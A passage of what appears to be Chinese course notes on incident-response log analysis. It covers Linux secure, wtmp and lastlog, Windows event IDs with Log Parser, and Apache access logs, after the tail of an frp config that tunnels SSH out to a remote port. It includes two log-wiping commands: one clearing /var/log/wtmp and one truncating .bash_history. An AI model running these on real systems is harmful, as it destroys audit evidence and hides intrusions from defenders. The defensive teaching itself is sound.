443</span><br><span class="line">[ssh]</span><br><span class="line">type = tcp</span><br><span class="line">local_port = 22</span><br><span class="line">remote_port = 5555</span><br><span class="line">注意frp客户端和服务端的 auth_token 和privilege_token 等要保持一致。</span><br><span class="line">启动frp客户端：</span><br><span class="line">frpc.exe -c frpc.ini</span><br><span class="line">更多使用方法详见</span><br><span class="line"><span class="section">https://github.com/fatedier/frp/blob/master/README_zh.md</span></span><br></pre></td></tr></table></figure>







<h1 id="日志-amp-流量分析"><a href="#日志-amp-流量分析" class="headerlink" title="日志&amp;流量分析"></a>日志&amp;流量分析</h1><h2 id="Linux日志分析"><a href="#Linux日志分析" class="headerlink" title="Linux日志分析"></a>Linux日志分析</h2><p><strong>日志类型</strong></p>
<p><strong>内核及系统日志</strong></p>
<p>这种日志由syslog统一管理，根据其主配置文件”/etc/syslog.conf”中的设置决定将内核消息及各种系统程序消息记录到什么位置。</p>
<p><strong>用户日志</strong></p>
<p>这种日志数据用于记录Linux系统用户登录及退出系统的相关信息，包括用户名、登录的终端、登录时间、来源主机、正在使用的进程操作等。 </p>
<p><strong>程序日志</strong></p>
<p>有些应用程序运会选择自己来独立管理一份日志文件（而不是交给syslog服务管理），用于记录本程序运行过程中的各种事件信息。由于这些程序只负责管理自己的日志文件，因此不同的程序所使用的日志记录格式可能会存在极大差异。</p>
<p>通过查看 /etc/rsyslog.conf ，可查看相关系统日志配置情况。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220801211012780.png" alt="image-20220801211012780"></p>
<p>linux系统日志一般存放在/var/log/目录下。</p>
<p>对于Linux系统中的一些常见日志文件，有必要熟悉其相应的用途，这样才能在需要的时候更快地找到问题所在，及时解决各种故障。</p>
<p>/var/log/messages：记录Linux内核消息及各种应用程序的公共日志信息，包括启动、IO错误、网络错误、程序故障等。对于未使用独立日志文件的应用程序或服务，一般都可以从该文件获得相关的事件记录信息。</p>
<p>/var/log/cron：记录crond计划任务产生的事件消息。</p>
<p>/varlog/dmesg：记录Linux系统在引导过程中的各种事件信息。</p>
<p>/var/log/maillog：记录进入或发出系统的电子邮件活动。</p>
<p>/var/log/lastlog：最近几次成功登录事件和最后一次不成功登录事件。</p>
<p>/var/log/rpmpkgs：记录系统中安装各rpm包列表信息。</p>
<p>/var/log/secure：记录用户登录认证过程中的事件信息.</p>
<p>/var/log/wtmp：记录每个用户登录、注销及系统启动和停机事件。</p>
<p>/var/log/utmp：记录当前登录的每个用户的详细信息</p>
<hr>
<p><strong>日志分析</strong></p>
<p>对于大多数文本格式的日志格式（如内核及系统日志、大多数的程序日志），只要使用tail、more、less、cat等文本处理工具就可以查看日志内容。而对于一些二进制格式的日志文件（eg：用户日志），则需要使用相应的查询命令。</p>
<p><strong>内核及系统日志:</strong></p>
<p>message日志，一般内核及大多数系统消息都被记录到公共日志文件”/var/log/messages”中，而其他一些程序消息被记录到不同的文件中，日志消息还能够记录到特定的存储设备中，或者直接向用户发送。具体根据rsyslog配置而定，日志如下</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220801211704131.png" alt="image-20220801211704131"></p>
<p>secure是应急中最常用的文件，主要记录系统存取数据的文件，如POP3、ssh、telnet、ftp等相关记录，从日志中可看出系统服务是否遭受到安全威胁，从如下日志中可看到ftp服务一直在被破解。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220801211732246.png" alt="image-20220801211732246"></p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">可通过grep命令查找文件里符合条件的字符串， 定位有多少IP在爆破主机的 root 帐号：</span><br><span class="line">grep <span class="string">&quot;Failed password for root&quot;</span> /<span class="keyword">var</span>/<span class="keyword">log</span>/secure | awk &#x27;&#123;<span class="keyword">print</span> <span class="variable">$11&#125;</span>&#x27; | <span class="keyword">sort</span> | uniq -c | <span class="keyword">sort</span> -nr | <span class="keyword">more</span></span><br><span class="line"></span><br><span class="line">定位有哪些 IP 在爆破：</span><br><span class="line">grep <span class="string">&quot;Failed password&quot;</span> /<span class="keyword">var</span>/<span class="keyword">log</span>/secure|grep -<span class="keyword">E</span> -o <span class="string">&quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;</span>|uniq -c</span><br><span class="line"></span><br><span class="line">爆破用户名字典是什么？</span><br><span class="line">grep <span class="string">&quot;Failed password&quot;</span> /<span class="keyword">var</span>/<span class="keyword">log</span>/secure|perl -<span class="keyword">e</span> &#x27;<span class="keyword">while</span>(<span class="variable">$_</span>=&lt;&gt;)&#123; /<span class="keyword">for</span>(.*?) from/; <span class="keyword">print</span> <span class="string">&quot;$1\n&quot;</span>;&#125;&#x27;|uniq -c|<span class="keyword">sort</span> -nr</span><br><span class="line"></span><br><span class="line">登录成功的 IP 有哪些：</span><br><span class="line">grep <span class="string">&quot;Accepted &quot;</span> /<span class="keyword">var</span>/<span class="keyword">log</span>/secure | awk &#x27;&#123;<span class="keyword">print</span> <span class="variable">$11&#125;</span>&#x27; | <span class="keyword">sort</span> | uniq -c | <span class="keyword">sort</span> -nr | <span class="keyword">more</span></span><br><span class="line"></span><br><span class="line">登录成功的日期、用户名、IP：</span><br><span class="line">grep <span class="string">&quot;Accepted &quot;</span> /<span class="keyword">var</span>/<span class="keyword">log</span>/secure | awk &#x27;&#123;<span class="keyword">print</span> <span class="variable">$1</span>,<span class="variable">$2</span>,<span class="variable">$3</span>,<span class="variable">$9</span>,<span class="variable">$11&#125;</span>&#x27;</span><br><span class="line"></span><br><span class="line">增加用户</span><br><span class="line">grep <span class="string">&quot;useradd&quot;</span> /<span class="keyword">var</span>/<span class="keyword">log</span>/secure </span><br><span class="line">删除用户</span><br><span class="line">grep <span class="string">&quot;userdel&quot;</span> /<span class="keyword">var</span>/<span class="keyword">log</span>/secure</span><br></pre></td></tr></table></figure>



<p><strong>用户日志</strong></p>
<p>wtmp日志记录了用户的登录、退出、重启等情况，可以查看系统是否存在异常用户登录，判断攻击者是否已经登录服务器，由于wtmp日志为二进制文件，所以利用用last命令查看:last -t 20190426120950 ,可查看这个时间之前的日志。                                                                              清除wtmp日志命令如下：# echo &gt; /var/log/wtmp</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220801212016136.png" alt="image-20220801212016136"></p>
<p>utmp日志记录当前用户的一些信息，由于utmp日志文件同样为二进制文件，可通过w、who命令查看</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220801212107855.png" alt="image-20220801212107855"></p>
<p>lastlog命令，用于显示系统中所有用户最近一次登录信息。lastlog文件在每次有用户登录时被查询。可以使用lastlog命令检查某特定用户上次登录的时间，并格式化输出上次登录日志/var/log/lastlog的内容。它根据UID排序显示登录名、端口号（tty）和上次登录时间。如果一个用户从未登录过，lastlog显示Never logged。注意需要以root身份运行该命令。</p>
<p><strong>程序日志</strong></p>
<p>在Linux系统中，还有相当一部分应用程序并没有使用syslog服务来管理日志。而是由程序自己维护日志记录。例如，httpd网站服务程序使用两个日志文件access_log和error_log。由于多数攻击都是发布在互联网的漏洞被利用导致，留存程序日志对于日后的溯源还是很有必要的，常见的中间件有weblogic、jboss、iis、tomcat，web日志记录攻击者的行为，可通过web日志知道攻击者通过什么方式进入系统。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220801212157804.png" alt="image-20220801212157804"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220801212226440.png" alt="image-20220801212226440"></p>
<p><strong>常用的shell命令</strong></p>
<p>Linux下常用的shell命令如：find、grep 、egrep、awk、sed</p>
<p>小技巧：标准unix/linux下的grep通过下面参数控制上下文：</p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">grep</span> -C <span class="number">5</span> foo <span class="keyword">file</span> 	显示<span class="keyword">file</span>文件里匹配foo字串那行以及上下<span class="number">5</span>行</span><br><span class="line">​	<span class="keyword">grep</span> -B <span class="number">5</span> foo <span class="keyword">file</span> 	显示foo及前<span class="number">5</span>行</span><br><span class="line">​	<span class="keyword">grep</span> -A <span class="number">5</span> foo <span class="keyword">file</span> 	显示foo及后<span class="number">5</span>行</span><br><span class="line">​   <span class="keyword">grep</span> -V		查看<span class="keyword">grep</span>版本号的方法</span><br><span class="line"></span><br><span class="line"><span class="keyword">grep</span> 查找含有某字符串的所有文件</span><br><span class="line"><span class="keyword">grep</span> -rni <span class="string">&quot;hello,world!&quot;</span> *</span><br><span class="line">* : 表示当前目录所有文件，也可以是某个文件名</span><br><span class="line">-r 是递归查找 （用于查找目录）</span><br><span class="line">-n 是显示行号</span><br><span class="line">-R 查找所有文件包含子目录</span><br><span class="line">-i 忽略大小写</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>、如何显示一个文件的某几行：</span><br><span class="line">    cat input_file | tail -n +<span class="number">1000</span> | head -n <span class="number">2000</span></span><br><span class="line">    #从第<span class="number">1000</span>行开始，显示<span class="number">2000</span>行。即显示<span class="number">1000</span>~<span class="number">2999</span>行</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>、在目录/etc中查找文件init</span><br><span class="line">    <span class="keyword">find</span> /etc -name init</span><br><span class="line"></span><br><span class="line"><span class="number">5</span>、只是显示<span class="regexp">/etc/</span>passwd的账户</span><br><span class="line">    `cat <span class="regexp">/etc/</span>passwd |awk  -F <span class="string">&#x27;:&#x27;</span>  <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>`  </span><br><span class="line">    ps：awk -F指定域分隔符为<span class="string">&#x27;:&#x27;</span>，将记录按指定的域分隔符划分域，填充域，​$<span class="number">0</span>则表示所有域,$<span class="number">1</span>表示第一个域,​$n表示第n个域。</span><br><span class="line"></span><br><span class="line"><span class="number">6</span>、sed -i <span class="string">&#x27;153,$d&#x27;</span> .bash_history</span><br><span class="line">    删除历史操作记录，只保留前<span class="number">153</span>行</span><br></pre></td></tr></table></figure>

<p><strong>常见日志分析方法</strong></p>
<p>由于日志文件通常是很大，如果单纯用命令去分析日志当然可以，但也会很累，让工具来帮我们分析日志不失为好的办法。自己写脚本，根据关键字去提取有用信息，比如根据ip地址、网站路径等，下图从日志中提取的攻击者用的网站目录。 </p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220801212408593.png" alt="image-20220801212408593"></p>
<p><strong>参考链接</strong></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">工具：</span><br><span class="line">https:<span class="regexp">//</span>security.tencent.com<span class="regexp">/index.php/</span>opensource<span class="regexp">/detail/</span><span class="number">15</span></span><br><span class="line">http:<span class="regexp">//</span>www.freebuf.com<span class="regexp">/sectool/</span><span class="number">126698</span>.html</span><br><span class="line">http:<span class="regexp">//</span>www.freebuf.com<span class="regexp">/sectool/</span><span class="number">110644</span>.html</span><br><span class="line">http:<span class="regexp">//</span>www.freebuf.com<span class="regexp">/sectool/</span><span class="number">8982</span>.html</span><br><span class="line">http:<span class="regexp">//</span>www.freebuf.com<span class="regexp">/articles/</span>web/<span class="number">96675</span>.html</span><br><span class="line"></span><br><span class="line">平台（商业项目）：</span><br><span class="line"><span class="number">360</span> &gt;&gt; <span class="number">360</span>星图		Splunk &gt;&gt; 机器数据引擎</span><br><span class="line">赛克蓝德 &gt;&gt; SeciLog	优特捷信息技术 &gt;&gt; 日志易</span><br><span class="line">HanSight瀚思 &gt;&gt; 安全易	百泉众合数据科技 &gt;&gt;LogInsight</span><br><span class="line">江南天安 &gt;&gt; 彩虹WEB攻击溯源</span><br><span class="line">平台开源项目：</span><br><span class="line">elk 	https:<span class="regexp">//</span>www.elastic.co</span><br><span class="line">scribe	https:<span class="regexp">//gi</span>thub.com<span class="regexp">/facebook/</span>scribe</span><br><span class="line">chukwa	http:<span class="regexp">//i</span>ncubator.apache.org<span class="regexp">/chukwa/</span></span><br><span class="line">kafka 	http:<span class="regexp">//</span>sna-projects.com<span class="regexp">/kafka/</span></span><br><span class="line">Flume	https:<span class="regexp">//gi</span>thub.com<span class="regexp">/cloudera/</span>flume/</span><br></pre></td></tr></table></figure>



<h2 id="Windows日志分析"><a href="#Windows日志分析" class="headerlink" title="Windows日志分析"></a>Windows日志分析</h2><p><strong>日志类型</strong></p>
<p>Windows主要有以下三类日志记录系统事件：应用程序日志、系统日志和安全日志。</p>
<p><strong>系统日志</strong></p>
<p>记录操作系统组件产生的事件，主要包括驱动程序、系统组件和应用软件的崩溃以及数据丢失错误等。系统日志中记录的时间类型由Windows NT/2000操作系统预先定义。</p>
<p>默认位置： <code>%SystemRoot%\System32\Winevt\Logs\System.evtx</code></p>
<p><strong>应用程序日志</strong></p>
<p>包含由应用程序或系统程序记录的事件，主要记录程序运行方面的事件，例如数据库程序可以在应用程序日志中记录文件错误，程序开发人员可以自行决定监视哪些事件。如果某个应用程序出现崩溃情况，那么我们可以从程序事件日志中找到相应的记录，也许会有助于你解决问题。 默认位置：<code>%SystemRoot%\System32\Winevt\Logs\Application.evtx</code></p>
<p><strong>安全日志</strong></p>
<p>记录系统的安全审计事件，包含各种类型的登录日志、对象访问日志、进程追踪日志、特权使用、帐号管理、策略变更、系统事件。安全日志也是调查取证中最常用到的日志。默认设置下，安全性日志是关闭的，管理员可以使用组策略来启动安全性日志，或者在注册表中设置审核策略，以便当安全性日志满后使系统停止响应。</p>
<p>默认位置：<code>%SystemRoot%\System32\Winevt\Logs\Security.evtx</code>         系统和应用程序日志存储着故障排除信息，对于系统管理员更为有用。 安全日志记录着事件审计信息，包括用户验证（登录、远程访问等）和特定用户在认证后对系统做了什么，对于调查人员而言，更有帮助。</p>
<p><strong>审核策略与事件查看器</strong></p>
<p>Windows Server 2008 R2 系统的审核功能在默认状态下并没有启用 ，建议开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。PS：默认状态下，也会记录一些简单的日志，日志默认大小20M设置1：开始 → 管理工具 → 本地安全策略 → 本地策略 → 审核策略，参考配置操作：</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220801212650998.png" alt="image-20220801212650998"></p>
<p>帐户管理：审核创建、更改、删除用户帐户或组，修改密码，禁用、启用、重命名用户帐户等；</p>
<p>登录事件：审核每个用户帐户登录或注销成功还是失败；</p>
<p>系统事件：审核对系统安全有影响的事件、重启或关闭计算机事件等；</p>
<p>特权使用：审核用户实施其权利的每一个实例；</p>
<p>目录服务访问：审核用户访问那些指定自己的系统访问控制列表（SACL）的 Active Directory（活动目录）对象的事件；</p>
<p>对象访问：审核用户访问文件、文件夹、注册表、打印机等对象，这些对象都有特定的系统访问控制列表（SACL）；</p>
<p>策略更改：审核用户权限分配策略、审核策略、信任策略更改的每一个事件；</p>
<p>帐户登录事件：审核在这台计算机用于验证帐户时，用户登录到其它计算机或从其它计算机注销的每个实例；</p>
<p>过程跟踪：审核“程序激活、进程退出、句柄复制、间接对象访问”等事件的详细跟踪信息。</p>
<p><strong>设置2：设置合理的日志属性，即日志最大大小、事件覆盖阀值等：</strong></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220801212806046.png" alt="image-20220801212806046"></p>
<p>查看系统日志方法：在“开始”菜单上，依次指向“所有程序”、“管理工具”，然后单击“事件查看器”按 “Window+R”，输入 ”eventvwr.msc“ 也可以直接进入“事件查看器”</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220801212836589.png" alt="image-20220801212836589"></p>
<hr>
<p><strong>日志分析</strong></p>
<p>事件日志分析</p>
<p>对于Windows事件日志分析，不同的EVENT ID代表了不同的意义，摘录一些常见的安全事件的说明：</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220801212922659.png" alt="image-20220801212922659"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220801212938238.png" alt="image-20220801212938238"></p>
<p><strong>日志分析工具</strong></p>
<p><strong>Log Parser</strong></p>
<p>Log Parser（是微软公司出品的日志分析工具，它功能强大，使用简单，可以分析基于文本的日志文件、XML 文件、CSV（逗号分隔符）文件，以及操作系统的事件日志、注册表、文件系统、Active Directory。它可以像使用 SQL 语句一样查询分析这些数据，甚至可以把分析结果以各种图表的形式展现出来。</p>
<p>基本查询结构:  Logparser.exe –i:EVT –o:DATAGRID “SELECT * FROM c:\xx.evtx”</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">使用Log Parser分析日志</span><br><span class="line"></span><br><span class="line">1、查询登录成功的事件</span><br><span class="line">登录成功的所有事件</span><br><span class="line">LogParser.exe -i:EVT –o:DATAGRID  &quot;<span class="keyword">SELECT</span> *  <span class="keyword">FROM</span> c:\Security.evtx <span class="keyword">where</span> EventID=<span class="number">4624</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">指定登录时间范围的事件：</span></span><br><span class="line"><span class="string">LogParser.exe -i:EVT –o:DATAGRID  &quot;</span><span class="keyword">SELECT</span> *  <span class="keyword">FROM</span> c:\Security.evtx <span class="keyword">where</span> TimeGenerated&gt;<span class="string">&#x27;2018-06-19 23:32:11&#x27;</span> <span class="keyword">and</span> TimeGenerated&lt;<span class="string">&#x27;2018-06-20 23:34:00&#x27;</span> <span class="keyword">and</span> EventID=<span class="number">4624</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">提取登录成功的用户名和IP：</span></span><br><span class="line"><span class="string">LogParser.exe -i:EVT  –o:DATAGRID  &quot;</span><span class="keyword">SELECT</span> EXTRACT_TOKEN(Message,<span class="number">13</span>,<span class="string">&#x27; &#x27;</span>) <span class="keyword">as</span> EventType,TimeGenerated <span class="keyword">as</span> LoginTime,EXTRACT_TOKEN(Strings,<span class="number">5</span>,<span class="string">&#x27;|&#x27;</span>) <span class="keyword">as</span> Username,EXTRACT_TOKEN(Message,<span class="number">38</span>,<span class="string">&#x27; &#x27;</span>) <span class="keyword">as</span> Loginip <span class="keyword">FROM</span> c:\Security.evtx <span class="keyword">where</span> EventID=<span class="number">4624</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2、查询登录失败的事件</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">登录失败的所有事件：</span></span><br><span class="line"><span class="string">LogParser.exe -i:EVT –o:DATAGRID  &quot;</span><span class="keyword">SELECT</span> *  <span class="keyword">FROM</span> c:\Security.evtx <span class="keyword">where</span> EventID=<span class="number">4625</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">提取登录失败用户名进行聚合统计：</span></span><br><span class="line"><span class="string">LogParser.exe  -i:EVT &quot;</span><span class="keyword">SELECT</span>  EXTRACT_TOKEN(Message,<span class="number">13</span>,<span class="string">&#x27; &#x27;</span>)  <span class="keyword">as</span> EventType,EXTRACT_TOKEN(Message,<span class="number">19</span>,<span class="string">&#x27; &#x27;</span>) <span class="keyword">as</span> <span class="keyword">user</span>,<span class="built_in">count</span>(EXTRACT_TOKEN(Message,<span class="number">19</span>,<span class="string">&#x27; &#x27;</span>)) <span class="keyword">as</span> Times,EXTRACT_TOKEN(Message,<span class="number">39</span>,<span class="string">&#x27; &#x27;</span>) <span class="keyword">as</span> Loginip <span class="keyword">FROM</span> c:\Security.evtx <span class="keyword">where</span> EventID=<span class="number">4625</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> Message<span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">3、系统历史开关机记录：</span></span><br><span class="line"><span class="string">LogParser.exe -i:EVT –o:DATAGRID  &quot;</span><span class="keyword">SELECT</span> TimeGenerated,EventID,Message <span class="keyword">FROM</span> c:\<span class="keyword">System</span>.evtx <span class="keyword">where</span> EventID=<span class="number">6005</span> <span class="keyword">or</span> EventID=<span class="number">6006</span><span class="string">&quot;</span></span><br></pre></td></tr></table></figure>

<p><strong>LogParser Lizard</strong></p>
<p>对于GUI环境的Log Parser Lizard，其特点是比较易于使用，甚至不需要记忆繁琐的命令，只需要做好设置，写好基本的SQL语句，就可以直观的得到结果。</p>
<p>下载地址：<a target="_blank" rel="noopener" href="http://www.lizard-labs.com/log_parser_lizard.aspx">http://www.lizard-labs.com/log_parser_lizard.aspx</a></p>
<p>依赖包：Microsoft .NET Framework 4 .5，下载地址：<a target="_blank" rel="noopener" href="https://www.microsoft.com/en-us/download/details.aspx?id=42642">https://www.microsoft.com/en-us/download/details.aspx?id=42642</a></p>
<p><strong>Event Log Explorer</strong></p>
<p>Event Log Explorer是一款非常好用的Windows日志分析工具。可用于查看，监视和分析跟事件记录，包括安全，系统，应用程序和其他微软Windows 的记录被记载的事件，其强大的过滤功能可以快速的过滤出有价值的信息。</p>
<p>下载地址：<a target="_blank" rel="noopener" href="https://event-log-explorer.en.softonic.com/">https://event-log-explorer.en.softonic.com/</a></p>
<h2 id="Web日志分析"><a href="#Web日志分析" class="headerlink" title="Web日志分析"></a>Web日志分析</h2><p><strong>日志分析</strong></p>
<p>Web访问日志记录了Web服务器接收处理请求及运行时错误等各种原始信息。通过对WEB日志进行的安全分析，不仅可以帮助我们定位攻击者，还可以帮助我们还原攻击路径，找到网站存在的安全漏洞并进行修复。</p>
<p>我们来看一条Apache的访问日志：</p>
<p><code>127.0.0.1 - - [11/Jun/2018:12:47:22 +0800] &quot;GET /login.html HTTP/1.1&quot; 200 786 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36&quot;</code></p>
<p>通过这条Web访问日志，我们可以清楚的得知用户在什么IP、什么时间、用什么操作系统、什么浏览器的情况下访问了你网站的哪个页面，是否访问成功。</p>
<p><strong>日志分析技巧</strong></p>
<p>在对WEB日志进行安全分析时，一般可以按照两种思路展开，逐步深入，还原整个攻击过程。</p>
<p>第一种：确定入侵的时间范围，以此为线索，查找这个时间范围内可疑的日志，进一步排查，最终确定攻击者，还原攻击过程。</p>
<p>第二种：攻击者在入侵网站后，通常会留下后门维持权限，以方便再次访问，我们可以找到该文件，并以此为线索来展开分析。</p>
<p>常用分析工具：Window下，推荐用 Sublime Text / Notepad++ 等进行日志分析，支持大文本，搜索效率还不错。</p>
<p>Linux下，使用Shell命令组合查询分析。Shell+Linux命令实现日志分析，一般结合grep、awk等命令等实现了几个常用的日志分析统计技巧。</p>
<p><strong>Apache日志分析技巧：</strong></p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">1、列出当天访问次数最多的IP命令：</span><br><span class="line">cut -<span class="keyword">d</span>- -f 1 log_file|uniq -c | <span class="keyword">sort</span> -rn | head -20</span><br><span class="line"></span><br><span class="line">2、查看当天有多少个IP访问：</span><br><span class="line">awk &#x27;&#123;<span class="keyword">print</span> <span class="variable">$1&#125;</span>&#x27; log_file|<span class="keyword">sort</span>|uniq|wc -<span class="keyword">l</span></span><br><span class="line"></span><br><span class="line">3、查看某一个页面被访问的次数：</span><br><span class="line">grep <span class="string">&quot;/index.php&quot;</span> log_file | wc -<span class="keyword">l</span></span><br><span class="line"></span><br><span class="line">4、查看每一个IP访问了多少个页面：</span><br><span class="line">awk &#x27;&#123;++S[<span class="variable">$1</span>]&#125; END &#123;<span class="keyword">for</span> (a <span class="keyword">in</span> S) <span class="keyword">print</span> a,S[a]&#125;&#x27; log_file</span><br><span class="line"></span><br><span class="line">5、将每个IP访问的页面数进行从小到大排序：</span><br><span class="line">awk &#x27;&#123;++S[<span class="variable">$1</span>]&#125; END &#123;<span class="keyword">for</span> (a <span class="keyword">in</span> S) <span class="keyword">print</span> S[a],a&#125;&#x27; log_file | <span class="keyword">sort</span> -<span class="keyword">n</span></span><br><span class="line"></span><br><span class="line">6、查看某一个IP访问了哪些页面：</span><br><span class="line">grep ^111.111.111.111 log_file| awk &#x27;&#123;<span class="keyword">print</span> <span class="variable">$1</span>,<span class="variable">$7&#125;</span>&#x27;</span><br><span class="line"></span><br><span class="line">7、去掉搜索引擎统计当天的页面：</span><br><span class="line">awk &#x27;&#123;<span class="keyword">print</span> <span class="variable">$12</span>,<span class="variable">$1&#125;</span>&#x27; log_file | grep ^\&quot;Mozilla | awk &#x27;&#123;<span class="keyword">print</span> <span class="variable">$2&#125;</span>&#x27; |<span class="keyword">sort</span> | uniq | wc -<span class="keyword">l</span></span><br><span class="line"></span><br><span class="line">8、查看2018年6月21日14时这一个小时内有多少IP访问:</span><br><span class="line">awk &#x27;&#123;<span class="keyword">print</span> <span class="variable">$4</span>,<span class="variable">$1&#125;</span>&#x27; log_file | grep 21/Jun/2018:14 | awk &#x27;&#123;<span class="keyword">print</span> <span class="variable">$2&#125;</span>&#x27;| <span class="keyword">sort</span> | uniq | wc -<span class="keyword">l</span></span><br></pre></td></tr></table></figure>

<p>日志统计分析技巧</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">统计爬虫：</span><br><span class="line">grep -<span class="keyword">E</span> &#x27;Googlebot|Baiduspider&#x27;  /www/logs/access.2019-02-23.<span class="keyword">log</span> | awk &#x27;&#123; <span class="keyword">print</span> <span class="variable">$1</span> &#125;&#x27; | <span class="keyword">sort</span> | uniq</span><br><span class="line"></span><br><span class="line">统计浏览器：</span><br><span class="line"><span class="keyword">cat</span> /www/logs/access.2019-02-23.<span class="keyword">log</span> | grep -v -<span class="keyword">E</span> &#x27;MSIE|Firefox|Chrome|Opera|Safari|Gecko|Maxthon&#x27; | <span class="keyword">sort</span> | uniq -c | <span class="keyword">sort</span> -r -<span class="keyword">n</span> | head -<span class="keyword">n</span> 100</span><br><span class="line"></span><br><span class="line">统计网段：</span><br><span class="line"><span class="keyword">cat</span> /www/logs/access.2019-02-23.<span class="keyword">log</span> | awk &#x27;&#123;<span class="keyword">print</span> <span class="variable">$1&#125;</span>&#x27; | awk -F&#x27;.&#x27; &#x27;&#123;<span class="keyword">print</span> <span class="variable">$1</span><span class="string">&quot;.&quot;</span><span class="variable">$2</span><span class="string">&quot;.&quot;</span><span class="variable">$3</span><span 